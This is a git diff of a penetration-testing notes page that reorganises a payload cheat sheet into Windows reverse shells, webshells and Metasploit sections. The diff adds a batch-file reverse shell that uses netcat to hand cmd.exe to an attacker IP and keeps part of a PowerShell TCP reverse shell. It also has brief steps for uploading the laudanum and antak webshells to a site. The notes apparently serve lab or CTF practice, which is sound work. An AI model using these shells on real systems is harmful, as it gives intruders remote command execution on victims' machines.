@@ -1,5 +1,5 @@
-# Payloads
 
+# Windows reverse shells
 ## Basic powershell reverse shell
 
 ```
@@ -12,18 +12,65 @@ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.98',1234);$stream = 
 
 ```
 ## reverse shell .bat
+```
+@echo off
+set ATTACKER_IP=10.10.14.98
+set PORT=1234
 
-## Staged vs non staged
+nc.exe %ATTACKER_IP% %PORT% -e cmd.exe
+```
+## Nishang
+
+
+## Webshells
+
+### laudanum
+Find the type of shell needed, make copy
+
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/bc795f21-8190-4590-a4a3-2fb35488a5fa)
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/54a0b631-94a3-4ce9-a001-6e5c213c3a7b)
+
+
+Add our IP
+
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/a8ee9650-7b22-4c93-9136-a06e2fe8129a)
+
+Upload file to site, go to location of file.
+
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/d49eabfc-1581-497d-bc91-b7346bb9d019)
+
+### antak
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/7d56c6d0-80cf-4e78-92c7-b43b8326ebf2)
+
+change login info
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/0393c2f3-08b3-4015-a1ce-699bbed4e6b2)
+
+Upload go to shell page
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/f5158b1f-e185-4343-9278-23ea1ece5ecc)# Payloads
+
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/49b877f9-8979-4760-9b1f-038c410c9e7f)
+
+
+## Shells with Metasploit
+
+### Staged vs non staged
 ```
 In Metasploit, the “/” character is used to denote whether a payload is staged or not,
 so shell_reverse_tcp at index 20 is not staged, whereas shell/reverse_tcp at index 15 is.
 ```
 
-## msfvenom
+### msfvenom
 
 ![Pasted image 20230508141045](https://github.com/dbissell6/Shadow_Stone/assets/50979196/988055f3-d9a3-4b0a-9e5b-be91b0886c30)
 
-## msfconsole
+### msfconsole
 
 g will set variable as global, useful when trying different exploits
 `setg rhosts 10.10.10.10`
